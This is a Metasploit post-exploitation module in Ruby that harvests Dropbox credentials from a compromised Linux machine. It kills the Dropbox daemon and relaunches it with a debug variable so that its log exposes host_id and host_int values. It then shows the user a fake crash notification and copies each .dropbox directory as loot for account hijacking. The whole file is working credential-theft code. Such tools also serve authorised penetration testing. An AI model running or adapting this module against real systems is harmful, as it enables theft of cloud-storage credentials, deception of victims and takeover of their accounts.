##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/unix'
require 'json'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Common
	include Msf::Post::Unix

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Gather Dropbox Credentials Collection',
			'Description'    => %q{
					This module will either collect the contents of user's .dropbox directory on the targeted machine *OR* will collect Dropbox's logs which have "credentials". This module works for at least Dropbox versions <= 1.6.17 .
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Dhiru Kholia <dhiru[at]openwall.com>'],
			'Platform'       => ['linux'],
			'SessionTypes'   => ['shell']
		))
	end

	def run
		print_status("Ensure your time is properly synced!")
		print_status("Finding .dropbox directories")
		paths = enum_user_directories.map {|d| d + "/.dropbox"}
		paths = paths.select { |d| directory?(d) }

		if paths.nil? or paths.empty?
			print_error("No users found with a .dropbox directory")
			return
		end

		download_loot(paths)
	end

	def download_loot(paths)
		print_status("Looting #{paths.count} directories")
		paths.each do |path|
			path.chomp!
			sep = "/"
			host_int = nil
			host_id = nil
			pwd = session.shell_command("pwd").chomp
			if pwd.nil? or pwd.empty?
				print_error("Session died?")
				return
			end
			session.shell_command("rm /tmp/dblog; killall dropboxd; killall dropbox")
			files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
			dropboxd_path = session.shell_command("which dropboxd").chomp
			if dropboxd_path.nil? or dropboxd_path.empty?
				print_error("Dropbox daemon path not found!")
			else
				session.shell_command("export DBDEV=a2y6shya; dropboxd &> /tmp/dblog &").chomp
				sleep(16)
				session.shell_command("killall dropboxd; killall dropbox")
				session.shell_command("notify-send Dropbox has crashed unexpectedly!")
				data = read_file("/tmp/dblog")
				session.shell_command("rm /tmp/dblog")
				if data.nil? or data.empty?
					print_error("No data in log file!")
				else
					data.each_line do |line|
						mo = line.match /host_int':\ (\d+)/
						if not mo.nil?
							host_int = mo[1]
						end
						mo = line.match /host_id':\ u'(.+)'/
						if not mo.nil?
							host_id = mo[1]
						end
					end

					if not host_id.nil? and not host_int.nil?
						data = JSON.dump([host_id, host_int])
						loot_path = store_loot("dropbox.jack", "text/plain", session, data,
							"dropbox_jack", "Dropbox jack info")
						print_good("File stored in: #{loot_path.to_s}")
						# we don't need contents of .dropbox in this case
						# but it is probably wise to fetch them still.
					end
				end
			end

			# We need to fetch the contents of .dropbox in this case!
			# In addtion, storing "path" is critical
			loot_path = store_loot("dropbox.path", "text/plain", session, path,
			       "dropbox_path}", "Dropbox path info")
			print_good("File stored in: #{loot_path.to_s}")

			files.each do |file|
				target = "#{path}#{sep}#{file}"
				if directory?(target)
					next
				end
				print_status("Downloading #{path}#{sep}#{file} -> #{file}")
				data = read_file(target)
				file = file.split(sep).last
				type = file.gsub(/\.dropbox.*/, "").gsub(/gpg\./, "")
				loot_path = store_loot("dropbox.#{type}", "text/plain", session, data,
					"dropbox_#{file}", "Dropbox #{file} File")
				print_good("File stored in: #{loot_path.to_s}")
			end

		end
	end

end
